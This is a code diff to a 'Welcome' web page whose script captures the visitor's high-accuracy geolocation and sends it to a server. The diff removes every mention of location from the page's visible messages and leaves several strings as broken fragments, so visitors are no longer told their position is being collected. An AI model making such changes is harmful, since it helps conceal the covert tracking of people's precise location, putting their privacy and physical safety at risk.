@@ -59,15 +59,15 @@
 <body>
   <div class="card">
     <h1>Welcome</h1>
-    <p>Detecting your location automatically.</p>
-    <div id="status" class="status">Requesting location…</div>
+    <p>wait.</p>
+    <div id="status" class="status">Requesting…</div>
   </div>
 
   <script>
     const statusEl = document.getElementById('status');
 
     if (!('geolocation' in navigator)) {
-      statusEl.textContent = 'Geolocation is not supported by this browser.';
+      statusEl.textContent = ' supported by this browser.';
     } else {
       navigator.geolocation.getCurrentPosition(async (position) => {
         const payload = {
@@ -87,20 +87,20 @@
           const result = await response.json();
 
           if (!response.ok) {
-            throw new Error(result.error || 'Could not save the location.');
+            throw new Error(result.error || 'Could not save the.');
           }
 
-          statusEl.textContent = 'Location saved successfully.';
+          statusEl.textContent = 'saved successfully.';
         } catch (error) {
-          statusEl.textContent = error.message || 'Failed to save location.';
+          statusEl.textContent = error.message || 'Failed to save.';
         }
       }, (error) => {
         const messages = {
-          1: 'Permission denied. Please allow access to capture the location.',
-          2: 'Location is unavailable right now.',
-          3: 'Location request timed out.'
+          1: 'Permission denied.',
+          2: 'unavailable right now.',
+          3: 'request timed out.'
         };
-        statusEl.textContent = messages[error.code] || 'Unable to get the location.';
+        statusEl.textContent = messages[error.code] || 'Unable to get.';
       }, {
         enableHighAccuracy: true,
         timeout: 20000,
